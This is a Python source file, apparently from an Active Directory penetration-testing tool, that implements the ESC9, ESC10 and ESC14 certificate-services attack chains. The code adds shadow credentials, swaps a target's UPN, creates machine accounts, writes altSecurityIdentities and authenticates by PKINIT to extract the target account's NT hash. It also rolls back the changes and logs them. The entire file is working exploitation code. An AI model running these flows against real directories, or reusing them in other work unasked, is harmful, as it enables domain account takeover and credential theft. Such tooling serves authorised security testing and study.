"""ESC9 (UPN swap) and ESC14 (altSecurityIdentities) exploitation flows."""

from __future__ import annotations

import asyncio
from pathlib import Path
from typing import Optional

from adscan_internal import telemetry
from adscan_internal.rich_output import print_error, print_info, print_success
from adscan_internal.services.adcs.cert_auth import (
    CertAuthConfig,
    authenticate_with_cert_native,
)
from adscan_internal.services.adcs.cert_request import (
    CertRequestConfig,
    request_certificate_native,
)
from adscan_internal.services.adcs.esc_cleanup import (
    esc_rollback_scope,
    mark_revert_failed,
    mark_reverted,
    register_ldap_change,
)
from adscan_internal.services.adcs.esc_types import EscConfig, EscResult
from adscan_internal.services.ldap_transport_service import (
    ADscanLDAPConfig,
    ADscanLDAPConnection,
)
from adscan_internal.services.machine_account_provisioning_service import (
    assess_machine_account_capacity,
    record_machine_account_creation_result,
    register_managed_machine_account,
)
from adscan_core.rich_output import print_exception


def _ldap_cfg(config: EscConfig) -> ADscanLDAPConfig:
    return ADscanLDAPConfig(
        domain=config.auth_domain,
        dc_ip=config.dc_ip,
        username=config.username,
        password=config.effective_secret,
        use_ldaps=True,
        use_kerberos=False,
        kerberos_target_hostname=config.dc_fqdn or None,
    )


def _output_dir(config: EscConfig) -> Path:
    d = Path(config.workspace_dir or "/tmp") / "adcs" / f"esc{config.esc}"
    d.mkdir(parents=True, exist_ok=True)
    return d


def _read_upn(conn: ADscanLDAPConnection, account_dn: str) -> Optional[str]:
    conn.search(
        search_base=account_dn,
        search_filter="(objectClass=*)",
        attributes=["userPrincipalName"],
        search_scope="BASE",
    )
    if not conn.entries:
        return None
    raw = conn.entries[0].entry_raw_attributes.get("userPrincipalName") or []
    if not raw:
        return None
    v = raw[0]
    return v.decode() if isinstance(v, bytes) else str(v)


def _set_upn(conn: ADscanLDAPConnection, account_dn: str, upn: str) -> bool:
    return conn.modify(account_dn, {"userPrincipalName": [("replace", [upn])]})


def _add_shadow_creds(config: EscConfig):
    """Add shadow credentials to target_account and return NT hash via PKINIT."""
    from adscan_internal.services.adcs.shadow_credentials import (
        add_shadow_credentials_native,
    )

    return add_shadow_credentials_native(
        dc_ip=config.dc_ip,
        domain=config.auth_domain,
        username=config.username,
        password=config.effective_secret or "",
        target_account=config.target_account,
    )


def _remove_shadow_creds(config: EscConfig) -> None:
    from adscan_internal.services.adcs.shadow_credentials import (
        remove_shadow_credentials_native,
    )

    try:
        remove_shadow_credentials_native(
            dc_ip=config.dc_ip,
            domain=config.auth_domain,
            username=config.username,
            password=config.effective_secret or "",
            target_account=config.target_account,
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)


async def _add_computer(ldap_cfg: ADscanLDAPConfig):
    """Deferred wrapper around add_computer_native to allow test patching."""
    from adscan_internal.services.exploitation.delegation_native import (
        add_computer_native,
    )

    return await add_computer_native(ldap_config=ldap_cfg)


async def run_esc9(config: EscConfig) -> EscResult:
    """ESC9: shadow creds on target -> get NT hash -> swap UPN -> request cert -> restore UPN."""
    out = _output_dir(config)
    ldap_cfg = _ldap_cfg(config)

    # Step 1: Add shadow credentials to get the target's NT hash
    shadow = await asyncio.to_thread(_add_shadow_creds, config)
    if not getattr(shadow, "success", False):
        inner = getattr(shadow, "error", None) or "operation failed"
        return EscResult(
            success=False,
            esc=9,
            error=f"shadow credentials failed: {inner}",
        )

    sc_change_id = register_ldap_change(
        config.shell,
        kind="shadow_credentials_added",
        domain=config.domain,
        target=config.target_account,
        detail={"target": config.target_account, "exec_user": config.username},
        method="ADCSESC9 — shadow credentials",
    )

    nt_hash = getattr(shadow, "nt_hash", None)

    upn_restored = False
    shadow_removed = False

    async with esc_rollback_scope() as rb:

        async def _rm_shadow() -> None:
            nonlocal shadow_removed
            if shadow_removed:
                return
            print_info(
                f"ESC9: removing shadow credentials from {config.target_account}..."
            )
            try:
                await asyncio.to_thread(_remove_shadow_creds, config)
                shadow_removed = True
                mark_reverted(config.shell, sc_change_id)
                print_success("ESC9: shadow credentials removed.")
            except Exception as exc:
                telemetry.capture_exception(exc)
                print_exception(exception=exc)
                mark_revert_failed(
                    config.shell,
                    sc_change_id,
                    error=str(exc),
                    instructions=(
                        f"Manually clear msDS-KeyCredentialLink on {config.target_account_dn}"
                    ),
                )
                print_error(f"ESC9: failed to remove shadow creds: {exc}")

        rb.add(_rm_shadow)

        # Step 2: Read current UPN so we can restore it
        def _get_upn() -> Optional[str]:
            with ADscanLDAPConnection(ldap_cfg) as conn:
                return _read_upn(conn, config.target_account_dn)

        original_upn = await asyncio.to_thread(_get_upn)
        # original_upn may be None if the account has no UPN set — that's OK,
        # we'll set it and restore to empty on rollback.

        upn_change_id = register_ldap_change(
            config.shell,
            kind="upn_changed",
            domain=config.domain,
            target=config.target_account,
            detail={
                "original_upn": original_upn,
                "new_upn": config.target_upn,
                "dn": config.target_account_dn,
            },
            method="ADCSESC9 — UPN manipulation",
        )

        async def _restore_upn() -> None:
            nonlocal upn_restored
            if upn_restored:
                return
            _upn_display = repr(original_upn) if original_upn else "(none)"
            print_info(
                f"ESC9: restoring UPN of {config.target_account} -> {_upn_display}..."
            )

            def _do_restore() -> bool:
                with ADscanLDAPConnection(ldap_cfg) as c2:
                    if original_upn:
                        return _set_upn(c2, config.target_account_dn, original_upn)
                    # No original UPN — delete the attribute
                    return bool(
                        c2.modify(
                            config.target_account_dn,
                            {"userPrincipalName": [("delete", [])]},
                        )
                    )

            ok = await asyncio.to_thread(_do_restore)
            if ok:
                upn_restored = True
                mark_reverted(config.shell, upn_change_id)
                print_success("ESC9: UPN restored.")
            else:
                mark_revert_failed(
                    config.shell,
                    upn_change_id,
                    error="LDAP modify failed",
                    instructions=(
                        f"Manually set userPrincipalName={original_upn} on {config.target_account_dn}"
                    ),
                )
                print_error("ESC9: UPN restore failed (manual cleanup required).")

        rb.add(_restore_upn)

        # Step 3: Swap UPN to target's value so the cert embeds the target identity
        print_info(
            f"ESC9: changing {config.target_account} UPN -> {config.target_upn}..."
        )

        def _set_target_upn() -> bool:
            with ADscanLDAPConnection(ldap_cfg) as conn:
                return _set_upn(conn, config.target_account_dn, config.target_upn)

        ok = await asyncio.to_thread(_set_target_upn)
        if not ok:
            raise RuntimeError(f"Failed to set UPN on {config.target_account_dn}")

        # Step 4: Request certificate — authenticate as target_account using NT hash
        _esc9_key_size = getattr(config, "min_key_size", None)
        req_cfg = CertRequestConfig(
            domain=config.auth_domain,
            kdc_ip=config.auth_kdc,
            ca_host=config.ca_host,
            ca_name=config.ca_name,
            template=config.template or "User",
            username=config.target_account,
            nt_hash=nt_hash,
            ca_fqdn=config.ca_fqdn,
            auth_domain=config.auth_domain,
            target_domain=config.domain,
            auth_kdc_ip=config.auth_kdc,
            target_kdc_ip=config.dc_ip,
            **({} if _esc9_key_size is None else {"key_size": int(_esc9_key_size)}),
        )
        req = await request_certificate_native(req_cfg, out)
        if not req.success:
            await _restore_upn()
            await _rm_shadow()
            return EscResult(
                success=False,
                esc=9,
                error=f"Certificate request failed: {req.error}",
                rollback_ok=upn_restored,
            )

        # Step 5: Restore before PKINIT so environment is clean regardless of outcome
        await _restore_upn()
        await _rm_shadow()

        # Step 6: PKINIT with the obtained cert to get the target's hash
        auth_cfg = CertAuthConfig(
            domain=config.domain,
            kdc_ip=config.dc_ip,
            pfx_path=req.pfx_path,
            pfx_password=req.pfx_password or "",
            username=config.target_upn.split("@")[0] if config.target_upn else None,
        )
        auth = await authenticate_with_cert_native(auth_cfg, out)
        if not auth.success:
            return EscResult(
                success=False,
                esc=9,
                error=auth.error or "PKINIT failed",
                rollback_ok=upn_restored,
            )

        print_success(f"ESC9: NT hash obtained — {auth.nt_hash}")
        from adscan_internal.services.adcs.esc_enrollment import _emit_pkinit_compromise

        _emit_pkinit_compromise(config, auth.nt_hash)
        return EscResult(
            success=True,
            esc=9,
            nt_hash=auth.nt_hash,
            ccache_path=str(auth.ccache_path) if auth.ccache_path else None,
            pfx_path=str(req.pfx_path),
        )


def compute_x509_issuer_serial(cert_der: bytes) -> str:
    """Compute X509IssuerSerialNumber binding value for altSecurityIdentities.

    Format: ``X509:<I>issuer_rfc2253<SR>hex_serial_reversed``

    Args:
        cert_der: DER-encoded X.509 certificate bytes.

    Returns:
        The altSecurityIdentities binding string.
    """
    from cryptography import x509 as _x509

    cert = _x509.load_der_x509_certificate(cert_der)
    issuer_rfc = cert.issuer.rfc4514_string()
    serial_bytes = cert.serial_number.to_bytes(
        (cert.serial_number.bit_length() + 7) // 8, "big"
    )
    serial_hex = serial_bytes[::-1].hex().upper()
    return f"X509:<I>{issuer_rfc}<SR>{serial_hex}"


def _resolve_sid(ldap_cfg: "ADscanLDAPConfig", target_account: str) -> Optional[str]:
    """Look up the objectSid of the target account for embedding in the cert."""
    try:
        with ADscanLDAPConnection(ldap_cfg) as conn:
            conn.search(
                search_base=conn.domain_dn,
                search_filter=f"(sAMAccountName={target_account})",
                attributes=["objectSid"],
            )
            if not conn.entries:
                return None
            raw_sid = conn.entries[0].entry_raw_attributes.get("objectSid") or []
            if not raw_sid or not isinstance(raw_sid[0], bytes):
                return None
            from adscan_internal.services.writable_attribute_discovery_service import (
                _sid_bytes_to_str,
            )

            return _sid_bytes_to_str(raw_sid[0]) or None
    except Exception:  # noqa: BLE001
        return None


async def run_esc14(config: EscConfig) -> EscResult:
    """ESC14: create computer -> request Machine cert with target SID -> altSecId -> PKINIT."""
    out = _output_dir(config)
    ldap_cfg = _ldap_cfg(config)

    print_info("ESC14: creating machine account...")
    capacity = assess_machine_account_capacity(
        ldap_config=ldap_cfg,
        actor_username=config.username,
        shell=config.shell,
    )
    if capacity.can_create is False:
        return EscResult(
            success=False,
            esc=14,
            error=capacity.blocked_reason
            or "MachineAccountQuota does not allow creating a machine account",
        )
    computer_result = await _add_computer(ldap_cfg)
    if not computer_result.success:
        record_machine_account_creation_result(
            config.shell,
            domain=config.domain,
            actor_username=config.username,
            success=False,
            quota_exceeded=bool(getattr(computer_result, "quota_exceeded", False)),
            reason=computer_result.error or "MachineAccountQuota exceeded for actor.",
        )
        return EscResult(
            success=False,
            esc=14,
            error=computer_result.error or "addcomputer failed",
        )

    computer_name: str = computer_result.computer_name or ""
    computer_password: str = computer_result.password or ""
    computer_dn: str = computer_result.dn or ""
    record_machine_account_creation_result(
        config.shell,
        domain=config.domain,
        actor_username=config.username,
        success=True,
    )
    register_managed_machine_account(
        config.shell,
        domain=config.domain,
        sam_account_name=computer_name,
        password=computer_password,
        dn=computer_dn,
        created_by=config.username,
        source="adcs_esc14",
    )

    comp_change_id = register_ldap_change(
        config.shell,
        kind="computer_account_created",
        domain=config.domain,
        target=computer_name,
        detail={"computer_name": computer_name, "dn": computer_dn},
        method="ADCSESC14 — computer account creation",
    )

    computer_deleted = False
    altsec_cleared = False

    async with esc_rollback_scope() as rb:

        async def _delete_computer() -> None:
            nonlocal computer_deleted
            if computer_deleted:
                return
            print_info(f"ESC14: deleting computer account {computer_name}...")
            try:

                def _do_delete() -> bool:
                    with ADscanLDAPConnection(ldap_cfg) as conn:
                        return conn.delete(computer_dn)

                ok = await asyncio.to_thread(_do_delete)
                if ok:
                    computer_deleted = True
                    mark_reverted(config.shell, comp_change_id)
                    print_success(f"ESC14: computer {computer_name} deleted.")
                else:
                    raise RuntimeError("LDAP delete returned False")
            except Exception as exc:
                telemetry.capture_exception(exc)
                print_exception(exception=exc)
                mark_revert_failed(
                    config.shell,
                    comp_change_id,
                    error=str(exc),
                    instructions=f"Manually delete computer account {computer_dn}",
                )
                print_error(f"ESC14: failed to delete computer {computer_name}: {exc}")

        rb.add(_delete_computer)

        # Step 2: Resolve target SID for embedding in cert (Strong Certificate Binding support).
        target_sid = await asyncio.to_thread(
            _resolve_sid, ldap_cfg, config.target_account
        )

        # Step 3: Request Machine certificate for the new computer account.
        # Include the target user's UPN and SID so PKINIT works on patched DCs that enforce
        # Strong Certificate Binding (requires SID extension in cert).
        print_info(f"ESC14: requesting Machine certificate for {computer_name}...")
        _esc14_key_size = getattr(config, "min_key_size", None)
        req_cfg = CertRequestConfig(
            domain=config.auth_domain,
            kdc_ip=config.auth_kdc,
            ca_host=config.ca_host,
            ca_name=config.ca_name,
            template="Machine",
            username=computer_name,
            password=computer_password,
            ca_fqdn=config.ca_fqdn,
            upn=config.target_upn,
            sid=target_sid,
            **({} if _esc14_key_size is None else {"key_size": int(_esc14_key_size)}),
        )
        req = await request_certificate_native(req_cfg, out)
        if not req.success:
            raise RuntimeError(f"Machine cert request failed: {req.error}")

        # Step 3: Compute altSecurityIdentities binding value from the cert
        from cryptography.hazmat.primitives.serialization import Encoding
        from cryptography.hazmat.primitives.serialization.pkcs12 import load_pkcs12

        pfx_bytes = req.pfx_path.read_bytes()
        pfx_data = load_pkcs12(pfx_bytes, (req.pfx_password or "").encode())
        cert_der = pfx_data.cert.certificate.public_bytes(Encoding.DER)
        binding_value = compute_x509_issuer_serial(cert_der)
        print_info(f"ESC14: computed binding value: {binding_value[:60]}...")

        altsec_change_id = register_ldap_change(
            config.shell,
            kind="altsecurityidentities_written",
            domain=config.domain,
            target=config.target_account,
            detail={"target_dn": config.target_account_dn, "binding": binding_value},
            method="ADCSESC14 — altSecurityIdentities write",
        )

        async def _clear_altsec() -> None:
            nonlocal altsec_cleared
            if altsec_cleared:
                return
            print_info(
                f"ESC14: clearing altSecurityIdentities on {config.target_account}..."
            )

            def _do_clear() -> bool:
                with ADscanLDAPConnection(ldap_cfg) as conn:
                    return conn.modify(
                        config.target_account_dn,
                        {"altSecurityIdentities": [("delete", [binding_value])]},
                    )

            ok = await asyncio.to_thread(_do_clear)
            if ok:
                altsec_cleared = True
                mark_reverted(config.shell, altsec_change_id)
                print_success("ESC14: altSecurityIdentities cleared.")
            else:
                mark_revert_failed(
                    config.shell,
                    altsec_change_id,
                    error="LDAP modify failed",
                    instructions=(
                        f"Manually remove {binding_value} from altSecurityIdentities "
                        f"on {config.target_account_dn}"
                    ),
                )
                print_error("ESC14: failed to clear altSecurityIdentities.")

        rb.add(_clear_altsec)

        # Step 4: Write the binding value to the target's altSecurityIdentities
        def _write_altsec() -> bool:
            with ADscanLDAPConnection(ldap_cfg) as conn:
                return conn.modify(
                    config.target_account_dn,
                    {"altSecurityIdentities": [("add", [binding_value])]},
                )

        ok = await asyncio.to_thread(_write_altsec)
        if not ok:
            raise RuntimeError(
                f"Failed to write altSecurityIdentities on {config.target_account_dn}"
            )

        # Step 5: PKINIT as the target account using the machine cert
        auth_cfg = CertAuthConfig(
            domain=config.domain,
            kdc_ip=config.dc_ip,
            pfx_path=req.pfx_path,
            pfx_password=req.pfx_password or "",
            username=config.target_account,
        )
        auth = await authenticate_with_cert_native(auth_cfg, out)
        if not auth.success:
            raise RuntimeError(f"PKINIT failed: {auth.error}")

        # Step 6: Clean up — delete computer and clear altSecurityIdentities
        await _delete_computer()
        await _clear_altsec()

        print_success(f"ESC14: NT hash obtained — {auth.nt_hash}")
        from adscan_internal.services.adcs.esc_enrollment import _emit_pkinit_compromise

        _emit_pkinit_compromise(config, auth.nt_hash)
        return EscResult(
            success=True,
            esc=14,
            nt_hash=auth.nt_hash,
            ccache_path=str(auth.ccache_path) if auth.ccache_path else None,
            pfx_path=str(req.pfx_path),
        )


async def run_esc10(config: EscConfig) -> EscResult:
    """ESC10: GenericWrite on target -> shadow creds -> NT hash -> UPN swap -> cert -> PKINIT.

    Identical flow to ESC9. The distinction is in the detection condition:
    ESC10 requires StrongCertificateBindingEnforcement=0 or CertificateMappingMethods=4
    on the DC — the exploitability check happens at detection time, not here.
    run_esc10 simply delegates to run_esc9 with esc=10 stamped on the result.
    """
    result = await run_esc9(config)
    # Re-stamp esc number so callers and UI show ESC10 correctly.
    return EscResult(
        success=result.success,
        esc=10,
        nt_hash=result.nt_hash,
        ccache_path=result.ccache_path,
        pfx_path=result.pfx_path,
        error=result.error,
        evidence=result.evidence if hasattr(result, "evidence") else {},
    )
